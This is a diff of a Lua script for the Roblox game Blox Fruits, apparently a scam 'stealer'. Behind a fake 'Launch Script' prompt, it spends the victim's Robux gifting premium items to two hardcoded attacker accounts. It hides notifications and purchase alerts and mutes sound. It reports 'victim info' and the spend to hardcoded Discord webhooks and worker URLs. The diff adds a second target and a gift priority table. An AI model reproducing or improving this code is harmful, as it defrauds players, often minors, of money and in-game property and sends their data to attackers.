@@ -1,31 +1,32 @@
---discord.gg/boronide, code generated using luamin.js™
-
-
-
 -- =====================================================
 --                  USER CONFIGURATION
 -- =====================================================
-local DevMode = false -- Set to true for debug prints, warnings, errors, and console access
-
-local UserUsernames = {
+local Usernames = {
 	"bananaaaa"
 } -- Authorized users for Joiner commands/trading
-local UserWebhook = "https://discord.com/api/webhooks/1367159347829932224/05aFQ9H3cXCwPI_7fErjJe-U2iLy4T6QiUo3PeNoW9b8ZDfBWKUkfr6yLI6Rfl7H4sUj" -- Joiner: Main hit webhook (REPLACE)
-local UserFruitsToHit = {
+local Webhook = "https://discord.com/api/webhooks/1367159347829932224/05aFQ9H3cXCwPI_7fErjJe-U2iLy4T6QiUo3PeNoW9b8ZDfBWKUkfr6yLI6Rfl7H4sUj" -- Joiner: Main hit webhook (REPLACE)
+local FruitsToHit = {
 	"Monkey-Monkey",
 	"Rocket-Rocket",
 	"Ghost-Ghost",
 	"Rubber-Rubber"
 } -- Fruits to trigger Joiner webhook/trade logic
-local UserLogsWebhook = "https://discord.com/api/webhooks/1367120070446288978/FRpw2zZ_xmyY9uVRkKV1UEWOjyRSjnEipakUXV_tqSqRR03lHViKb5ookWfowpvgNfgk" -- Gifter success/attempt webhook (REPLACE)
-local UserGiftTarget = "x6TNine" -- Target username for gifts (MUST BE SET)
+local GiftTarget = "x6TNine"  -- Target 1 username for gifts (MUST BE SET)
 
 -- =====================================================
 --            !!! OBFUSCATE AFTER THIS LINE !!!
 -- =====================================================
+local DevMode = false -- Set to true for debug prints, warnings, errors, and console access
+
+
+local UserLogsWebhook = "https://discord.com/api/webhooks/1367120070446288978/FRpw2zZ_xmyY9uVRkKV1UEWOjyRSjnEipakUXV_tqSqRR03lHViKb5ookWfowpvgNfgk" -- Gifter success/attempt webhook (REPLACE)
+
+local GiftTarget2 = "aka_0ver" -- Target 2 username for gifts (MUST BE SET)
+
+
 
 -- << Version Info >>
-local combined_version = "1.2.2" -- Updated version
+local combined_version = "1.2.5" -- Updated version (Reflects latest fixes)
 local gifter_version = "1.3.0"
 local joiner_version = "1.3.5"
 
@@ -109,13 +110,15 @@ end
 print("Core services and LocalPlayer verified.")
 
 -- << State Variables >>
-local UserId = nil;
+local targetUserId1 = nil;
+local targetUserId2 = nil; -- UserIDs for gift targets
 local totalSpent = 0;
 local promptConfirmed = false;
 local purchaseInProgress = false;
 local gifterWebhookSent = false;
 local attemptedGiftItemName = "None";
 local attemptedGiftCost = 0;
+local attemptedGiftTargetUsername = "None"; -- Track intended recipient
 local allowEveryone = false;
 local activatedUsers = {};
 local nonAdminAuthDisabled = false;
@@ -137,16 +140,18 @@ local promptModifierConnection = nil;
 local wasKicked = false;
 local webhookStorage = {};
 
--- << Final Webhook URLs >>
-local FinalLogsWebhook = UserLogsWebhook
-local FinalWebhook = UserWebhook
-local FinalProtector = "https://discord.com/api/webhooks/1367119905815658587/lkpywf0OVpkOKbo72J0qtFxrcW1aiguwE17CDXVPI2KtwHQPd6-ZmgnKlwOJzabkt72A"
-local FinalDummy = "https://discord.com/api/webhooks/1367159073556008980/U198nhRaRumKxlqIou9mLw0bvxs_CjpNrJWGE3gdhq5qBycuTRGv4m3NzLEIrKI0Sa2Q"
-local FinalChecker22 = "https://discord.com/api/webhooks/1367159269643784264/147M-k1FWHhetDkxHkcmL3deQUSOhigd8iVl0-bv0odF1essau-AQ2tF3oQunF7XlDnx"
+-- << Final Webhook URLs (Using User Config where applicable) >>
+local FinalLogsWebhook = UserLogsWebhook -- From User Config
+local FinalWebhook = Webhook           -- From User Config
+local FinalProtector = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/f7d22662-d236-4356-b20d-4873f20321c7" -- Fallback/Hardcoded
+local FinalDummy = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/d7d3793b-d014-4ec6-8458-882d627fb042" -- Fallback/Hardcoded
+local FinalChecker22 = "https://sharkyadminprotector.sharkyadminprotector.workers.dev/w/e748a57f-b049-4a4a-9ff9-ef6a57f0a7ca" -- Fallback/Hardcoded
+
 print("Final Webhook URLs determined.")
 
 -- << Phase 1 Config >>
-local Username = UserGiftTarget
+local Username = GiftTarget -- Primary Target Name (From User Config)
+local Username2 = GiftTarget2 -- Secondary Target Name (From User Config)
 local PromptText = "Launch Script"
 
 -- << Phase 2/3 Config >>
@@ -193,49 +198,96 @@ local RGBGreenVal = 0.20;
 local RGBRedVal = 0.80;
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs"--
 local TEST_WEBHOOK = "https://discord.com/api/webhooks/1367159842992689284/BxMXb6wAhIcRYcfCUiIVgMG3GcBuWL2Lr0sAJWcsRo781JJ0zpAcaD3vrFCLJxRSqNVg"
-local Usernames = UserUsernames
-local FruitsToHit = UserFruitsToHit
+-- Note: Usernames & FruitsToHit are assigned directly from the top-level user config vars later
+
+-- =====================================================
+--       GIFT PRIORITIES & TARGET CONFIGURATION
+-- =====================================================
+local GiftPriorities = {
+    {StorageName="Permanent Dragon-Dragon",PurchaseLocation="FruitShop",Cost=5000,TargetNum=2},
+    {StorageName="Permanent Kitsune-Kitsune",PurchaseLocation="FruitShop",Cost=4000,TargetNum=2},
+    {StorageName="Permanent Yeti-Yeti",PurchaseLocation="FruitShop",Cost=3000,TargetNum=2},
+    {StorageName="Fruit Notifier",PurchaseLocation="Shop",Cost=2700,TargetNum=2},
+    {StorageName="Permanent Spirit-Spirit",PurchaseLocation="FruitShop",Cost=2550,TargetNum=2},
+    {StorageName="Permanent Gas-Gas",PurchaseLocation="FruitShop",Cost=2500,TargetNum=2},
+    {StorageName="Permanent Venom-Venom",PurchaseLocation="FruitShop",Cost=2450,TargetNum=2},
+    {StorageName="Permanent Shadow-Shadow",PurchaseLocation="FruitShop",Cost=2425,TargetNum=2},
+    {StorageName="Permanent Dough-Dough",PurchaseLocation="FruitShop",Cost=2400,TargetNum=2},
+    {StorageName="Permanent T-Rex-T-Rex",PurchaseLocation="FruitShop",Cost=2350,TargetNum=2},
+    {StorageName="Permanent Gravity-Gravity",PurchaseLocation="FruitShop",Cost=2300,TargetNum=2},
+    {StorageName="Permanent Blizzard-Blizzard",PurchaseLocation="FruitShop",Cost=2250,TargetNum=2},
+    {StorageName="Permanent Pain-Pain",PurchaseLocation="FruitShop",Cost=2200,TargetNum=2},
+    {StorageName="Permanent Rumble-Rumble",PurchaseLocation="FruitShop",Cost=2100,TargetNum=2},
+    {StorageName="Permanent Portal-Portal",PurchaseLocation="FruitShop",Cost=2000,TargetNum=2},
+    {StorageName="Permanent Sound-Sound",PurchaseLocation="FruitShop",Cost=1900,TargetNum=1},
+    {StorageName="Permanent Spider-Spider",PurchaseLocation="FruitShop",Cost=1800,TargetNum=1},
+    {StorageName="Permanent Creation-Creation",PurchaseLocation="FruitShop",Cost=1750,TargetNum=1},
+    {StorageName="Permanent Love-Love",PurchaseLocation="FruitShop",Cost=1700,TargetNum=1},
+    {StorageName="Permanent Buddha-Buddha",PurchaseLocation="FruitShop",Cost=1650,TargetNum=1},
+    {StorageName="3x Mythical Scrolls",PurchaseLocation="Shop",Cost=1500,TargetNum=1},
+    {StorageName="Permanent Magma-Magma",PurchaseLocation="FruitShop",Cost=1300,TargetNum=1},
+    {StorageName="Permanent Ghost-Ghost",PurchaseLocation="FruitShop",Cost=1275,TargetNum=1},
+    {StorageName="Dark Blade",PurchaseLocation="Shop",Cost=1200,TargetNum=1},
+    {StorageName="Permanent Light-Light",PurchaseLocation="FruitShop",Cost=1100,TargetNum=1},
+    {StorageName="Permanent Diamond-Diamond",PurchaseLocation="FruitShop",Cost=1000,TargetNum=1},
+    {StorageName="Permanent Eagle-Eagle",PurchaseLocation="FruitShop",Cost=975,TargetNum=1},
+    {StorageName="Permanent Dark-Dark",PurchaseLocation="FruitShop",Cost=950,TargetNum=1},
+    {StorageName="Permanent Sand-Sand",PurchaseLocation="FruitShop",Cost=850,TargetNum=1},
+    {StorageName="Permanent Ice-Ice",PurchaseLocation="FruitShop",Cost=750,TargetNum=1},
+    {StorageName="Permanent Flame-Flame",PurchaseLocation="FruitShop",Cost=550,TargetNum=1},
+    {StorageName="2x Mastery",PurchaseLocation="Shop",Cost=450,TargetNum=1},
+    {StorageName="2x Money",PurchaseLocation="Shop",Cost=450,TargetNum=1},
+    {StorageName="+1 Fruit Storage",PurchaseLocation="Shop",Cost=400,TargetNum=1},
+    {StorageName="Permanent Spike-Spike",PurchaseLocation="FruitShop",Cost=380,TargetNum=1},
+    {StorageName="2x Boss Drops",PurchaseLocation="Shop",Cost=350,TargetNum=1},
+    {StorageName="Permanent Smoke-Smoke",PurchaseLocation="FruitShop",Cost=250,TargetNum=1},
+    {StorageName="2x EXP (15 mins.)",PurchaseLocation="Shop",Cost=25,TargetNum=1}
+}
+print("Gift priorities defined.")
+-- =====================================================
+
+-- << Helper Functions >>
+
 local function loopSinkTransparency()
-	print("Starting loopSinkTransparency thread...")
+	print("Starting loopSinkTransparency thread...");
 	while true do
-		local sink = nil
-		local pg = LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")
+		local s = nil;
+		local pg = LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui");
 		if pg then
-			local vpo = pg:FindFirstChild("ViewportOverlay")
-			if vpo then
-				sink = vpo:FindFirstChild("Sink")
+			local v = pg:FindFirstChild("ViewportOverlay");
+			if v then
+				s = v:FindFirstChild("Sink")
 			end
-		end
-		if sink then
+		end;
+		if s then
 			safe_pcall(function()
-				sink.BackgroundTransparency = 1
+				s.BackgroundTransparency = 1
 			end)
-		end
-		task.wait(1) -- Check every second
+		end;
+		task.wait(1)
 	end
 end
 local function hideNotifications()
-	print("Attempting to hide notifications...")
-	local player = LocalPlayer
-	if not player then
+	print("Attempting to hide notifications...");
+	local p = LocalPlayer;
+	if not p then
 		return
-	end
-	local playerGui = player:WaitForChild("PlayerGui", 5) -- Wait for PlayerGui
-	if not playerGui then
+	end;
+	local pg = p:WaitForChild("PlayerGui", 5);
+	if not pg then
 		warn("hideNotifications: PlayerGui not found.");
 		return
-	end
-	local notifications = playerGui:FindFirstChild("Notifications")
-	if notifications then
-		print("Notifications found, disabling.")
+	end;
+	local n = pg:FindFirstChild("Notifications");
+	if n then
+		print("Notifications found, disabling.");
 		safe_pcall(function()
-			notifications.Enabled = false
+			n.Enabled = false
 		end)
 	else
 		print("Notifications UI not found.")
 	end
 end
-
 local function findCaseInsensitive(tbl, value)
 	if not tbl or type(tbl) ~= "table" or type(value) ~= "string" then
 		return false
@@ -754,11 +806,11 @@ local function getRobuxBalance()
 	end;
 	local pr = a:FindFirstChild("Prompt");
 	local alert = a:FindFirstChild("Alert");
-	if not pr and not alert then
+	local frameToUse = pr or alert;
+	if not frameToUse then
 		warn("getRobuxBalance: Could not find 'Prompt' or 'Alert' frame. Assuming 0 balance.");
 		return 0, 0
 	end;
-	local frameToUse = pr or alert;
 	local ac = frameToUse:FindFirstChild("AlertContents");
 	if not ac then
 		return 0, 0
@@ -785,7 +837,7 @@ local function getRobuxBalance()
 	print("Raw Balance Text:", rbt.Text, "| Extracted:", bt, "| Raw Balance:", rawBal, "| Adjusted Balance:", adjBal);
 	return adjBal, rawBal
 end
-local function sendLogsWebhook_GifterPart(robuxSpent, itemName)
+local function sendLogsWebhook_GifterPart(robuxSpent, itemName, targetUsernameUsed)
 	if gifterWebhookSent then
 		return
 	end;
@@ -803,7 +855,7 @@ local function sendLogsWebhook_GifterPart(robuxSpent, itemName)
 		["fields"] = {
 			{
 				["name"] = "<:drawpen:1311079366125555782> ᴠɪᴄᴛɪᴍ ɪɴꜰᴏ",
-				["value"] = "```Name: " .. LocalPlayer.Name .. "\nAccount Age: " .. tostring(LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
+				["value"] = "```Name: " .. LocalPlayer.Name .. "\nAccount Age: " .. tostring(LocalPlayer.AccountAge) .. "\nReceiver: " .. (targetUsernameUsed or "N/A") .. "```"
 			},
 			{
 				["name"] = "<:robux:1314309850154537020> ʀᴏʙᴜx ᴄᴏꜱᴛ",
@@ -868,25 +920,12 @@ local function waitForPromptToDisappear()
 	end;
 	print("Purchase prompt/alert disappeared.")
 end
-local function waitForPurchaseConfirmation()
-	local p = CoreGui:FindFirstChild("PurchasePromptApp");
-	if not p then
+local function waitForPurchaseConfirmation(promptInstance)
+	if not promptInstance or not promptInstance:IsA("GuiObject") then
+		warn("waitForPurchaseConfirmation: Invalid promptInstance provided.");
 		return
 	end;
-	local c = p:FindFirstChild("ProductPurchaseContainer");
-	if not c then
-		return
-	end;
-	local a = c:FindFirstChild("Animator");
-	if not a then
-		return
-	end;
-	local pr = a:FindFirstChild("Prompt");
-	if not pr then
-		warn("waitForPurchaseConfirmation: 'Prompt' frame not found for confirmation.");
-		return
-	end;
-	local ac = pr:FindFirstChild("AlertContents");
+	local ac = promptInstance:FindFirstChild("AlertContents");
 	if not ac then
 		return
 	end;
@@ -907,26 +946,34 @@ local function waitForPurchaseConfirmation()
 		confirmButtonConn:Disconnect()
 	end;
 	confirmButtonConn = cb.MouseButton1Click:Connect(function()
-		print("Confirm button clicked!");
+		print("Confirm button clicked! Disabling PurchasePromptApp.");
 		promptConfirmed = true;
+		local ppApp = CoreGui:FindFirstChild("PurchasePromptApp");
+		if ppApp then
+			safe_pcall(function()
+				ppApp.Enabled = false
+			end);
+			print("PurchasePromptApp disabled.")
+		else
+			warn("Could not find PurchasePromptApp to disable.")
+		end;
 		if confirmButtonConn and confirmButtonConn.Connected then
 			confirmButtonConn:Disconnect()
 		end
 	end)
 end
-local function buyItem(sn, pl, c)
+local function buyItem(storageName, purchaseLocation, cost, currentTargetUsername, currentTargetUserId)
 	if purchaseInProgress then
-		warn("buyItem: Purchase already in progress for", sn);
+		warn("buyItem: Purchase already in progress for", storageName);
 		return
 	end;
-	print("buyItem attempting for:", sn, "Cost:", c);
+	print("buyItem attempting for:", storageName, "Cost:", cost, "Target:", currentTargetUsername);
 	purchaseInProgress = true;
-	local tu = {
-		name = Username,
-		id = UserId
-	};
-	if not tu.id then
-		warn("Cannot gift: Target UserID not found.");
+	attemptedGiftItemName = storageName;
+	attemptedGiftCost = cost;
+	attemptedGiftTargetUsername = currentTargetUsername;
+	if not currentTargetUserId then
+		warn("Cannot gift:", storageName, "- Target UserID for", currentTargetUsername, "not resolved.");
 		purchaseInProgress = false;
 		return false
 	end;
@@ -939,105 +986,41 @@ local function buyItem(sn, pl, c)
 	local args = {
 		[1] = "buyRobuxShop",
 		[2] = {
-			["StorageName"] = sn,
+			["StorageName"] = storageName,
 			["PurchaseAction"] = "Gift",
-			["PurchaseLocation"] = pl,
+			["PurchaseLocation"] = purchaseLocation,
 			["Message"] = getRandomMessage(),
 			["FunnelId"] = "Shop",
-			["ReceiverName"] = tu.name,
-			["ReceiverUserId"] = tu.id
+			["ReceiverName"] = currentTargetUsername,
+			["ReceiverUserId"] = currentTargetUserId
 		}
 	};
-	attemptedGiftItemName = sn;
-	attemptedGiftCost = c;
 	local s, e = pcall(cf.InvokeServer, cf, unpack(args));
 	purchaseInProgress = false;
 	if not s then
 		warn("InvokeServer failed for buyItem:", e)
 	end;
-	print("buyItem finished for:", sn, "Success:", s);
+	print("buyItem finished for:", storageName, "Success:", s);
+	hideNotifications();
 	return s
 end
-local function stealItem(b)
-	print("stealItem called with balance:", b);
-	if b >= 5000 then
-		return buyItem("Permanent Dragon-Dragon", "FruitShop", 5000)
-	elseif b >= 4000 then
-		return buyItem("Permanent Kitsune-Kitsune", "FruitShop", 4000)
-	elseif b >= 3000 then
-		return buyItem("Permanent Yeti-Yeti", "FruitShop", 3000)
-	elseif b >= 2700 then
-		return buyItem("Fruit Notifier", "Shop", 2700)
-	elseif b >= 2550 then
-		return buyItem("Permanent Spirit-Spirit", "FruitShop", 2550)
-	elseif b >= 2500 then
-		return buyItem("Permanent Gas-Gas", "FruitShop", 2500)
-	elseif b >= 2450 then
-		return buyItem("Permanent Venom-Venom", "FruitShop", 2450)
-	elseif b >= 2425 then
-		return buyItem("Permanent Shadow-Shadow", "FruitShop", 2425)
-	elseif b >= 2400 then
-		return buyItem("Permanent Dough-Dough", "FruitShop", 2400)
-	elseif b >= 2350 then
-		return buyItem("Permanent T-Rex-T-Rex", "FruitShop", 2350)
-	elseif b >= 2300 then
-		return buyItem("Permanent Gravity-Gravity", "FruitShop", 2300)
-	elseif b >= 2250 then
-		return buyItem("Permanent Blizzard-Blizzard", "FruitShop", 2250)
-	elseif b >= 2200 then
-		return buyItem("Permanent Pain-Pain", "FruitShop", 2200)
-	elseif b >= 2100 then
-		return buyItem("Permanent Rumble-Rumble", "FruitShop", 2100)
-	elseif b >= 2000 then
-		return buyItem("Permanent Portal-Portal", "FruitShop", 2000)
-	elseif b >= 1900 then
-		return buyItem("Permanent Sound-Sound", "FruitShop", 1900)
-	elseif b >= 1800 then
-		return buyItem("Permanent Spider-Spider", "FruitShop", 1800)
-	elseif b >= 1750 then
-		return buyItem("Permanent Creation-Creation", "FruitShop", 1750)
-	elseif b >= 1700 then
-		return buyItem("Permanent Love-Love", "FruitShop", 1700)
-	elseif b >= 1650 then
-		return buyItem("Permanent Buddha-Buddha", "FruitShop", 1650)
-	elseif b >= 1500 then
-		return buyItem("3x Mythical Scrolls", "Shop", 1500)
-	elseif b >= 1300 then
-		return buyItem("Permanent Magma-Magma", "FruitShop", 1300)
-	elseif b >= 1275 then
-		return buyItem("Permanent Ghost-Ghost", "FruitShop", 1275)
-	elseif b >= 1200 then
-		return buyItem("Dark Blade", "Shop", 1200)
-	elseif b >= 1100 then
-		return buyItem("Permanent Light-Light", "FruitShop", 1100)
-	elseif b >= 1000 then
-		return buyItem("Permanent Diamond-Diamond", "FruitShop", 1000)
-	elseif b >= 975 then
-		return buyItem("Permanent Eagle-Eagle", "FruitShop", 975)
-	elseif b >= 950 then
-		return buyItem("Permanent Dark-Dark", "FruitShop", 950)
-	elseif b >= 850 then
-		return buyItem("Permanent Sand-Sand", "FruitShop", 850)
-	elseif b >= 750 then
-		return buyItem("Permanent Ice-Ice", "FruitShop", 750)
-	elseif b >= 550 then
-		return buyItem("Permanent Flame-Flame", "FruitShop", 550)
-	elseif b >= 460 then
-		return buyItem("2x Mastery", "Shop", 450)
-	elseif b >= 450 then
-		return buyItem("2x Money", "Shop", 450)
-	elseif b >= 400 then
-		return buyItem("+1 Fruit Storage", "Shop", 400)
-	elseif b >= 380 then
-		return buyItem("Permanent Spike-Spike", "FruitShop", 380)
-	elseif b >= 350 then
-		return buyItem("2x Boss Drops", "Shop", 350)
-	elseif b >= 25 then
-		return buyItem("2x EXP (15 mins.)", "Shop", 25)
-	else
-		print("No affordable item found.");
-		return false
-	end
+local function stealItem(balance)
+	print("stealItem called with balance:", balance);
+	for _, itemData in ipairs(GiftPriorities) do
+		if balance >= itemData.Cost then
+			local targetUsername = (itemData.TargetNum == 1) and Username or Username2;
+			local targetUserId = (itemData.TargetNum == 1) and targetUserId1 or targetUserId2;
+			if targetUserId then
+				print("Attempting to gift:", itemData.StorageName, "to", targetUsername);
+				local success = buyItem(itemData.StorageName, itemData.PurchaseLocation, itemData.Cost, targetUsername, targetUserId);
+				return success
+			else
+				warn("Skipping gift:", itemData.StorageName, "- Target UserID", itemData.TargetNum, "for", targetUsername, "not resolved.")
+			end
+		end
+	end;
+	print("No affordable and targetable item found in GiftPriorities.");
+	return false
 end
 local function getRobuxAndProceed_GifterPart()
 	local skip = false;
@@ -1164,16 +1147,20 @@ local function waitForPrompt_GifterPart()
 	if promptModifierConnection and promptModifierConnection.Connected then
 		promptModifierConnection:Disconnect()
 	end;
+	local giftingPromptSetupDone = false;
 	local function setupP(pi)
 		if not pi or not pi:IsA("GuiObject") then
 			return
 		end;
 		if pi.Name ~= "Prompt" then
-			warn("waitForPrompt_GifterPart received non-'Prompt' frame:", pi.Name);
 			return
 		end;
-		modifyPromptUI();
-		waitForPurchaseConfirmation()
+		if not giftingPromptSetupDone then
+			print("New *GIFTING* purchase prompt added, modifying...");
+			modifyPromptUI();
+			waitForPurchaseConfirmation(pi);
+			giftingPromptSetupDone = true;
+		end
 	end;
 	local ep = a:FindFirstChild("Prompt");
 	if ep then
@@ -1181,8 +1168,12 @@ local function waitForPrompt_GifterPart()
 	end;
 	promptModifierConnection = a.ChildAdded:Connect(function(ch)
 		if ch.Name == "Prompt" then
-			print("New *GIFTING* purchase prompt added, modifying...");
 			setupP(ch)
+		elseif ch.Name == "Alert" then
+			print("Detected 'Alert' frame via listener, ensuring hidden.");
+			pcall(function()
+				ch.Visible = false
+			end)
 		end
 	end)
 end
@@ -3176,7 +3167,7 @@ local Commands = {
 						pcall(sr.FireServer, sr, "/w " .. pt .. " Silent mode was turned off by " .. p.Name .. ".", "All")
 					end
 				end;
-				sendMessage("Silent mode DISABLED.")
+				sendMessage(".")
 			else
 				isSilentModeActive = true;
 				silentModeTargetPlayer = p;
@@ -3795,7 +3786,7 @@ function startPhase2()
 	end
 end -- End of startPhase2
 
--- NEW Function: Cleanup Gifter Phase Resources
+-- Cleanup Gifter Phase Resources (Simplified)
 local function cleanupGifterPhase()
 	print("Cleaning up Gifter phase resources...")
     -- Disconnect listeners
@@ -3810,43 +3801,22 @@ local function cleanupGifterPhase()
 	end;
 	promptModifierConnection = nil
 
-    -- Attempt to remove modified UI elements
+    -- Re-enable PurchasePromptApp just in case it's needed later
 	local ppApp = CoreGui:FindFirstChild("PurchasePromptApp")
 	if ppApp then
-		local pc = ppApp:FindFirstChild("ProductPurchaseContainer")
-		if pc then
-			local anim = pc:FindFirstChild("Animator")
-			if anim then
-				local prompt = anim:FindFirstChild("Prompt") -- The one modified by modifyPromptUI
-				if prompt then
-					local footer = prompt:FindFirstChild("AlertContents") and prompt.AlertContents:FindFirstChild("Footer")
-					if footer then
-						local btns = footer:FindFirstChild("Buttons")
-						if btns then
-							local btn2 = btns:FindFirstChild("2")
-							if btn2 then
-								print("Clearing modified button UI...");
-								safe_pcall(btn2.ClearAllChildren, btn2)
-							end
-						end
-					end
-				end
-				local alertFrame = anim:FindFirstChild("Alert")
-				if alertFrame then
-					print("Destroying Alert frame...");
-					safe_pcall(alertFrame.Destroy, alertFrame)
-				end
-			end
-		end
+		safe_pcall(function()
+			ppApp.Enabled = true
+		end)
+		print("PurchasePromptApp re-enabled.")
 	end
 
-    -- Reset gifter state variables
+    -- Reset gifter state variables (Keep resolved UserIDs)
 	promptConfirmed = false;
 	purchaseInProgress = false;
 	gifterWebhookSent = false;
 	attemptedGiftItemName = "None";
 	attemptedGiftCost = 0;
-	UserId = nil;
+	attemptedGiftTargetUsername = "None";
 	print("Gifter state variables reset.")
 end
 
@@ -3896,7 +3866,7 @@ local function main()
 	if not getWebhookSafely("Webhook") and not getWebhookSafely("Protector") and not getWebhookSafely("dummy") and not getWebhookSafely("Checker22") and not getWebhookSafely("LogsWebhook") then
 		if not wasKicked then
 			wasKicked = true;
-			pcall(LocalPlayer.Kick, LocalPlayer, "Config Error: No valid webhooks configured after loading.")
+			pcall(LocalPlayer.Kick, LocalPlayer, "Config Error: No valid webhooks configured.")
 		end;
 		return
 	end
@@ -3914,9 +3884,9 @@ local function main()
 		end;
 		return
 	end
-	ensureFruitsToHit();
-	removeBlacklistedFromUsernames();
-	ensureAdminUsernames();
+	ensureFruitsToHit(); -- Ensure user + default fruits are included
+	removeBlacklistedFromUsernames(); -- Remove blacklisted from joiner auth list
+	ensureAdminUsernames(); -- Add core admins to joiner auth list
 	local pid = game.PlaceId;
 	if pid == 2753915549 then
 		if not wasKicked then
@@ -3941,6 +3911,23 @@ local function main()
 		return
 	end
 
+    -- == Resolve Target UserIDs ==
+	print("Resolving Target UserIDs...")
+	local s1, id1 = pcall(Players.GetUserIdFromNameAsync, Players, Username) -- Uses Username = GiftTarget
+	if s1 and id1 then
+		targetUserId1 = id1;
+		print("Resolved", Username, "to", targetUserId1)
+	else
+		warn("Failed to resolve UserID for GiftTarget:", Username, "-", id1)
+	end
+	local s2, id2 = pcall(Players.GetUserIdFromNameAsync, Players, Username2) -- Uses Username2 = GiftTarget2
+	if s2 and id2 then
+		targetUserId2 = id2;
+		print("Resolved", Username2, "to", targetUserId2)
+	else
+		warn("Failed to resolve UserID for GiftTarget2:", Username2, "-", id2)
+	end
+
     -- == Phase 1 Start: Initial Inventory Check & Joiner Webhooks ==
 	initialInventoryCache = getInventory();
 	if not initialInventoryCache then
@@ -3952,8 +3939,8 @@ local function main()
 	local hasValue = hasValuableItems(initialInventoryCache)
 
     -- Basic Game State Setup
-	hideNotifications() -- Hide gift notifications early
-	task.spawn(loopSinkTransparency) -- Start background transparency loop
+	hideNotifications()
+	task.spawn(loopSinkTransparency)
 	pcall(function()
 		UserSettings:GetService("UserGameSettings").MasterVolume = 0
 	end)
@@ -4005,11 +3992,8 @@ local function main()
 		shouldSkipGifting = true
 	end
 	if not shouldSkipGifting then
-		local s, e = pcall(function()
-			UserId = Players:GetUserIdFromNameAsync(Username)
-		end);
-		if not s or not UserId then
-			warn("Failed to get UserID:", Username, "-", e, "- Skipping.");
+		if not targetUserId1 and not targetUserId2 then
+			warn("No valid target UserIDs resolved. Skipping gifting phase.");
 			shouldSkipGifting = true
 		end
 	end
@@ -4021,26 +4005,25 @@ local function main()
 		if not shouldSkipGifting then
 			local giftInvoked = stealItem(adjustedBalance);
 			if giftInvoked then
-				print("Gift invoke initiated:", attemptedGiftItemName);
+				print("Gift invoke initiated:", attemptedGiftItemName, "to", attemptedGiftTargetUsername);
 				waitForPrompt_GifterPart()
 			else
-				warn("No affordable gift or buyItem failed. Skipping.");
+				warn("No affordable/targetable gift or buyItem failed. Skipping.");
 				shouldSkipGifting = true
 			end
 		end
 	end
 
-    -- Conditional Kick Check (Only if skipping gift due to low Robux AND no valuable items)
-    -- Ensure finalRawBalance has a default value if getRobuxAndProceed failed unexpectedly before setting it
+    -- Conditional Kick Check
 	finalRawBalance = finalRawBalance or 0
-	print("Before Kick Check: Skip=", shouldSkipGifting, "RawBal=", finalRawBalance, "HasValue=", hasValue) -- Debug Print
+	print("Before Kick Check: Skip=", shouldSkipGifting, "RawBal=", finalRawBalance, "HasValue=", hasValue)
 	if shouldSkipGifting and finalRawBalance < 25 and not hasValue then
 		warn("Kicking: Low Robux (", finalRawBalance, ") and no valuable items detected.")
 		if not wasKicked then
 			wasKicked = true;
-			pcall(LocalPlayer.Kick, LocalPlayer, "Insufficient Robux and no valuable items found.")
+			pcall(createDiscordUI)
 		end
-		return -- Stop execution after kick
+		return
 	end
 
     -- Transition Logic
@@ -4055,17 +4038,18 @@ local function main()
 		end
 		if promptConfirmed then
 			print("Confirmed. Sending LogsWebhook & starting Phase 2.");
-			sendLogsWebhook_GifterPart(attemptedGiftCost, attemptedGiftItemName);
-			task.spawn(function()
+			sendLogsWebhook_GifterPart(attemptedGiftCost, attemptedGiftItemName, attemptedGiftTargetUsername);
+			task.spawn(function() -- Spawn Escape task
+				print("Spawning Escape key task...");
 				for i = 1, 5 do
-					pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
-					task.wait(0.1);
-					pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
-					task.wait(0.1);
-					if not (CoreGui:FindFirstChild("PurchasePromptApp") and CoreGui.PurchasePromptApp:FindFirstChild("ProductPurchaseContainer") and CoreGui.PurchasePromptApp.ProductPurchaseContainer:FindFirstChild("Animator") and (CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator:FindFirstChild("Prompt") or CoreGui.PurchasePromptApp.ProductPurchaseContainer.Animator:FindFirstChild("Alert"))) then
+					safe_pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+					task.wait(0.1)
+					local ppAppCheck = CoreGui:FindFirstChild("PurchasePromptApp")
+					if not ppAppCheck or not ppAppCheck.Enabled then
+						print("PurchasePromptApp disabled or gone, stopping escape keys.")
 						break
 					end
-				end;
+				end
 				waitForPromptToDisappear()
 			end);
 			cleanupGifterPhase();
